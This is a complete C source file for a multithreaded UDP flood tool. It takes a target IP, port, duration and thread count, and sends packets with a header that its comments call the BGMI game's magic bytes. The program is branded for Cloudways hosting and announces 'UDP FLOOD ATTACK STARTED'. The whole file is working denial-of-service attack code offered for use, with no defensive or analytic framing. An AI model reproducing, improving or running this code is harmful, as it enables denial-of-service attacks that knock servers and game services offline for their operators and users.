#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

// ============================================
// CONFIGURATION - OPTIMIZED FOR CLOUDWAYS
// ============================================
#define PAYLOAD_COUNT 20
#define PACKET_SIZE 64        // 64 bytes (optimal for Cloudways)
#define SOCKET_REUSE 1
#define BIND_PORT 0           // Let OS choose source port

// Global stop flag for graceful exit
volatile sig_atomic_t stop_attack = 0;

void handle_signal(int sig) {
    stop_attack = 1;
}

void usage() {
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║     UDP FLOOD TOOL - CLOUDWAYS EDITION     ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Usage: ./bgmi <IP> <PORT> <TIME> <THREADS> ║\n");
    printf("║ Example: ./bgmi 1.1.1.1 80 60 500         ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int duration;
    int thread_id;
};

// Optimized BGMI-like payloads (20 unique payloads)
unsigned char payloads[PAYLOAD_COUNT][PACKET_SIZE] = {
    // Payload 0-4: Standard BGMI pattern
    {0x16, 0x9e, 0x56, 0xc2, 0xf0, 0x22, 0xe3, 0x66, 0xf4, 0x6a, 0x55, 0xdf, 0x27, 0x01, 0x1c, 0x5a, 0x00},
    {0x16, 0x9e, 0x56, 0xc2, 0xf4, 0x22, 0xe3, 0x66, 0xf4, 0x54, 0x55, 0xdc, 0x27, 0x01, 0x1e, 0x3a, 0x00},
    {0x16, 0x9e, 0x56, 0xc2, 0xc8, 0x22, 0xe3, 0x66, 0xf4, 0x54, 0x55, 0xdc, 0x27, 0x01, 0x1e, 0x1a, 0x00},
    {0x16, 0x9e, 0x56, 0xc2, 0xcc, 0x22, 0xe3, 0x66, 0xf4, 0x6a, 0x55, 0xdf, 0x27, 0x01, 0x1c, 0xfa, 0x00},
    {0x16, 0x9e, 0x56, 0xc2, 0xc0, 0x22, 0xe3, 0x66, 0xf4, 0x6b, 0xd5, 0xdc, 0x27, 0x01, 0x1d, 0xda, 0x00},
    
    // Payload 5-9: Variation pattern
    {0x16, 0x9e, 0x56, 0xc2, 0xc4, 0x22, 0x9e, 0xc8, 0xf5, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08},
    {0x16, 0x9e, 0x56, 0xc2, 0xd8, 0x22, 0x9e, 0xc8, 0xf5, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10},
    {0x16, 0x9e, 0x56, 0xc2, 0xdc, 0x22, 0xe3, 0x66, 0xf4, 0x54, 0x55, 0xdc, 0x27, 0x01, 0x1e, 0xba, 0x00},
    {0x16, 0x9e, 0x56, 0xc2, 0xd0, 0x22, 0x9c, 0xc8, 0xf5, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18},
    {0x16, 0x9e, 0x56, 0xc2, 0xd4, 0x22, 0x9c, 0xc8, 0xf5, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20},
    
    // Payload 10-14: Randomized pattern
    {0x16, 0x9e, 0x56, 0xc2, 0x28, 0x22, 0xe3, 0x66, 0xf4, 0x6b, 0xd5, 0xdc, 0x27, 0x01, 0x1d, 0x9a, 0x00},
    {0x16, 0x9e, 0x56, 0xc2, 0x2c, 0x22, 0x82, 0xc8, 0xf5, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28},
    {0x16, 0x9e, 0x56, 0xc2, 0x20, 0x22, 0xe3, 0x66, 0xf4, 0x6b, 0xd5, 0xdc, 0x27, 0x01, 0x1d, 0x7a, 0x00},
    {0x16, 0x9e, 0x56, 0xc2, 0x24, 0x22, 0x80, 0x48, 0xec, 0x74, 0xb9, 0xc5, 0x41, 0xb0, 0xfc, 0x37, 0x00},
    {0x16, 0x9e, 0x56, 0xc2, 0x38, 0x22, 0x80, 0xc8, 0xf5, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30},
    
    // Payload 15-19: Extra variation
    {0x16, 0x9e, 0x56, 0xc2, 0x40, 0x22, 0xe3, 0x66, 0xf4, 0x6a, 0x55, 0xdf, 0x27, 0x01, 0x1c, 0x5b, 0x31},
    {0x16, 0x9e, 0x56, 0xc2, 0x44, 0x22, 0xe3, 0x66, 0xf4, 0x54, 0x55, 0xdc, 0x27, 0x01, 0x1e, 0x3b, 0x32},
    {0x16, 0x9e, 0x56, 0xc2, 0x48, 0x22, 0x9e, 0xc8, 0xf5, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x40},
    {0x16, 0x9e, 0x56, 0xc2, 0x4c, 0x22, 0x9c, 0xc8, 0xf5, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48},
    {0x16, 0x9e, 0x56, 0xc2, 0x50, 0x22, 0xe3, 0x66, 0xf4, 0x6b, 0xd5, 0xdc, 0x27, 0x01, 0x1d, 0x9b, 0x49}
};

// Initialize random payloads at runtime for better variation
void init_random_payloads() {
    srand(time(NULL));
    for (int i = 0; i < PAYLOAD_COUNT; i++) {
        // Keep first 4 bytes as BGMI magic header
        payloads[i][0] = 0x16;
        payloads[i][1] = 0x9e;
        payloads[i][2] = 0x56;
        payloads[i][3] = 0xc2;
        
        // Randomize remaining bytes
        for (int j = 4; j < PACKET_SIZE; j++) {
            payloads[i][j] = rand() % 256;
        }
    }
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    int payload_index = data->thread_id % PAYLOAD_COUNT;
    unsigned long long packet_count = 0;
    
    // Create UDP socket with optimization flags
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    
    // Socket optimization for maximum throughput
    int val = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
    
    // Increase socket buffer size
    int buffer_size = 1024 * 1024;  // 1MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    
    if (inet_pton(AF_INET, data->ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid IP address");
        close(sock);
        pthread_exit(NULL);
    }
    
    endtime = time(NULL) + data->duration;
    
    // Attack loop - optimized for Cloudways
    while (time(NULL) <= endtime && !stop_attack) {
        // Send payloads in round-robin fashion
        for (int i = 0; i < PAYLOAD_COUNT && !stop_attack; i++) {
            if (sendto(sock, payloads[payload_index], PACKET_SIZE, 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                // Silent fail - don't spam errors
                break;
            }
            packet_count++;
            payload_index = (payload_index + 1) % PAYLOAD_COUNT;
        }
    }
    
    close(sock);
    
    // Print thread stats
    printf("[Thread %d] Sent %llu packets\n", data->thread_id, packet_count);
    
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Setup signal handler for graceful exit
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    if (argc != 5) {
        usage();
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    // Input validation
    if (port < 1 || port > 65535) {
        printf("❌ Invalid port! Use 1-65535\n");
        exit(1);
    }
    
    if (duration < 1 || duration > 3600) {
        printf("❌ Invalid duration! Use 1-3600 seconds\n");
        exit(1);
    }
    
    if (threads < 1 || threads > 2000) {
        printf("❌ Invalid threads! Use 1-2000\n");
        exit(1);
    }
    
    // Optional: Initialize random payloads
    // init_random_payloads();
    
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data *thread_data_array = malloc(threads * sizeof(struct thread_data));
    
    printf("\n╔══════════════════════════════════════════════════════╗\n");
    printf("║              UDP FLOOD ATTACK STARTED                ║\n");
    printf("╠══════════════════════════════════════════════════════╣\n");
    printf("║ Target    : %s:%d\n", ip, port);
    printf("║ Duration  : %d seconds\n", duration);
    printf("║ Threads   : %d\n", threads);
    printf("║ Payloads  : %d (%d bytes each)\n", PAYLOAD_COUNT, PACKET_SIZE);
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    
    // Create threads
    for (int i = 0; i < threads; i++) {
        thread_data_array[i].ip = ip;
        thread_data_array[i].port = port;
        thread_data_array[i].duration = duration;
        thread_data_array[i].thread_id = i + 1;
        
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&thread_data_array[i]) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            free(thread_data_array);
            exit(1);
        }
    }
    
    printf("✅ All %d threads launched successfully!\n", threads);
    printf("⏳ Attack running for %d seconds... (Press Ctrl+C to stop)\n\n", duration);
    
    // Wait for all threads to complete
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }
    
    free(thread_ids);
    free(thread_data_array);
    
    printf("\n╔══════════════════════════════════════════════════════╗\n");
    printf("║                  ATTACK FINISHED                     ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n");
    
    return 0;
}